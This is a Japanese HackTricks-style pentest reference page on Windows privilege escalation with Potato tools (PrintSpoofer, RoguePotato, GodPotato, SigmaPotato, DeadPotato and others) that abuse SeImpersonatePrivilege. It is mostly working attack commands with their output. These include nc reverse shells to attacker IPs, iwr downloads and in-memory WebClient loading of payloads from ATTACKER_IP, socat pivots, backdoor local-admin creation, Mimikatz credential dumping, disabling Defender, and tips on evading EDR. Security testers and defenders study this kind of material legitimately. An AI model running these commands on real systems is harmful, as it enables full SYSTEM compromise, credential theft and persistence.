# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato は動作しません**。Windows Server 2019 および Windows 10 build 1809 以降では使用できません。ただし、[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**、** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**、** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**、** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**、** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**、** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** を使用して、**同じ権限を利用し、`NT AUTHORITY\SYSTEM`** レベルのアクセス権を取得できます。この [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) では、`PrintSpoofer` tool について詳しく解説しています。この tool は、JuicyPotato が動作しなくなった Windows 10 および Server 2019 ホスト上で、impersonation privileges を悪用するために使用できます。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> 2024–2025 年に頻繁にメンテナンスされている modern alternative は SigmaPotato（GodPotato の fork）です。in-memory/.NET reflection の使用と、拡張された OS support が追加されています。以下の quick usage と References の repo を参照してください。

背景および手動の techniques については、以下の関連ページを参照してください。

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements and common gotchas

以下のすべての techniques は、次のいずれかの privileges を保持する context から、impersonation-capable な privileged service を悪用することに依存します。

- SeImpersonatePrivilege（最も一般的）または SeAssignPrimaryTokenPrivilege
- token にすでに SeImpersonatePrivilege が含まれている場合、High integrity は必要ありません（IIS AppPool、MSSQL など、多くの service accounts では一般的です）

Privileges をすばやく確認します。
```cmd
whoami /priv | findstr /i impersonate
```
運用上の注意:

- シェルが SeImpersonatePrivilege を持たない restricted token の下で実行されている場合（特定のコンテキストにおける Local Service/Network Service でよくあります）、FullPowers を使用してアカウントのデフォルト権限を取り戻し、その後 Potato を実行します。例: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- PrintSpoofer には、Print Spooler サービスが実行中で、local RPC endpoint（spoolss）経由で到達可能であることが必要です。PrintNightmare 後に Spooler が無効化されている hardened environment では、RoguePotato/GodPotato/DCOMPotato/EfsPotato を優先してください。
- RoguePotato には、TCP/135 で到達可能な OXID resolver が必要です。egress がブロックされている場合は、redirector/port-forwarder を使用してください（下記の例を参照）。古い build では -f flag が必要でした。
- EfsPotato/SharpEfsPotato は MS-EFSR を abuse します。いずれかの pipe がブロックされている場合は、代替 pipe（lsarpc、efsrpc、samr、lsass、netlogon）を試してください。
- RpcBindingSetAuthInfo 中の Error 0x6d3 は通常、unknown/unsupported RPC authentication service を示します。別の pipe/transport を試すか、target service が実行中であることを確認してください。
- DeadPotato のような “Kitchen-sink” fork には、追加の payload module（Mimikatz/SharpHound/Defender off）が含まれており、disk に書き込みます。slim な original と比較して、より高い EDR detection が予想されます。

## 簡単なデモ

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
注意:
- 現在のコンソールでインタラクティブプロセスを起動するには `-i`、ワンライナーを実行するには `-c` を使用できます。
- Spooler service が必要です。無効になっている場合、これは失敗します。

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
アウトバウンドの135番ポートがブロックされている場合は、redirector上でsocatを使ってOXID resolverをpivotする：<sup>[[9]](#references)</sup>
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotatoは、Spooler/BITSではなく**PrintNotify**サービスを標的とする、2022年末に公開された新しいCOM abuse primitiveです。このバイナリはPrintNotify COM serverをインスタンス化し、偽の`IUnknown`を差し替えた後、`CreatePointerMoniker`を通じて特権コールバックをトリガーします。**SYSTEM**として実行されているPrintNotifyサービスが接続してくると、プロセスは返されたtokenを複製し、完全な権限で指定されたpayloadを起動します。<sup>[[13]](#references)</sup>

主な運用上の注意点:

* Print Workflow/PrintNotifyサービスがインストールされている限り、Windows 10/11およびWindows Server 2012–2022で動作します（PrintNightmare後にlegacy Spoolerが無効化されている場合でも、このサービスは存在します）。
* 呼び出し元のcontextに`SeImpersonatePrivilege`が必要です（IIS APPPOOL、MSSQL、scheduled-task service accountでは一般的です）。
* 直接commandを指定する方法と、元のconsole内に留まれるinteractive modeのいずれかを使用できます。例:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* 純粋にCOMベースであるため、named-pipe listenerやexternal redirectorは不要です。そのため、DefenderがRoguePotatoのRPC bindingをブロックするhost上でdrop-in replacementとして使用できます。

Ink DragonのようなOperatorは、SharePointでViewState RCEを取得した直後にPrintNotifyPotatoを実行し、ShadowPadをインストールする前に`w3wp.exe` workerからSYSTEMへpivotします。<sup>[[14]](#references)</sup>

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
ヒント: いずれかのpipeが失敗するか、EDRによってブロックされた場合は、他のサポートされているpipeを試してください:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
メモ:
- SeImpersonatePrivilege が存在する場合、Windows 8/8.1–11 および Server 2012–2022 で動作します。
- インストールされている runtime に一致する binary を取得します（例: modern Server 2022 では `GodPotato-NET4.exe`）。
- 初期の execution primitive が、timeout の短い webshell/UI の場合は、payload を script として stage し、長い inline command の代わりに GodPotato に実行させます。<sup>[[12]](#references)</sup>

書き込み可能な IIS webroot からの簡単な staging パターン:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotatoは、デフォルトでRPC_C_IMP_LEVEL_IMPERSONATEを使用するservice DCOM objectsを対象とした2つのvariantを提供します。提供されているbinariesをbuildまたは使用し、commandを実行します：
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato（updated GodPotato fork）

SigmaPotato は、.NET reflection を介した in-memory execution や PowerShell reverse shell helper など、modern な利便性を追加します。<sup>[[8]](#references)</sup>
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
2024–2025 builds (v1.2.x) の追加機能:
- Built-in reverse shell flag `--revshell` と 1024 文字の PowerShell limit の撤廃により、長い AMSI-bypassing payloads を一度に実行可能。
- Reflection-friendly syntax（`[SigmaPotato]::Main()`）に加え、`VirtualAllocExNuma()` を使用した簡易的な AV evasion trick により、単純な heuristics を回避。
- PowerShell Core environments 向けに、.NET 2.0 against で compiled された個別の `SigmaPotatoCore.exe`。

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato は GodPotato の OXID/DCOM impersonation chain を維持しつつ、post-exploitation helpers を組み込んでいるため、operators は追加の tooling なしで直ちに SYSTEM を取得し、persistence/collection を実行できます。<sup>[[15]](#references)</sup>

Common modules（すべて SeImpersonatePrivilege が必要）:

- `-cmd "<cmd>"` — SYSTEM として arbitrary command を spawn。
- `-rev <ip:port>` — quick reverse shell。
- `-newadmin user:pass` — persistence 用に local admin を作成。
- `-mimi sam|lsa|all` — Mimikatz を drop して実行し、credentials を dump（disk に触れるため noisy）。
- `-sharphound` — SYSTEM として SharpHound collection を実行。
- `-defender off` — Defender real-time protection を無効化（非常に noisy）。

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
追加のバイナリが含まれているため、AV/EDRによる検知フラグが増えることが予想されます。ステルス性が重要な場合は、よりスリムなGodPotato/SigmaPotatoを使用してください。

## 参考文献

- [1] [PrintSpoofer – Windows 10およびServer 2019でのImpersonation Privilegesの悪用](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [もうJuicyPotatoは不要？古い話です。RoguePotatoを紹介します](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – service accountsのデフォルトのtoken privilegesを復元](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → NTFS junctionからwebrootへのRCE → FullPowers + GodPotatoでSYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice macro → IIS webshell → GodPotatoでSYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Ink Dragonの内部：ステルス性の高い攻撃作戦におけるRelay Networkと内部動作の解明](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – 組み込みpost-ex modulesを備えたGodPotatoのrework](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
